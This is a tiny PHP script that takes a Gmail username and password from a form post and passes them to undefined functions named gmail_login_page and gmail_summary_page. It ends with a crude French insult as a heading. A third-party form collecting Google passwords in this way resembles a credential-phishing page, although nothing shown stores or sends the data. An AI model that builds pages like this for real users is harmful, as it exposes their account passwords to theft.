<?php

$user = $_POST["user"];
$password = $_POST["password"];

if (!$user or !$password)
    gmail_login_page();
else
    gmail_summary_page($user, $password);

?>

<h1><strong>BOUFFE MES COUILLES</strong></h1>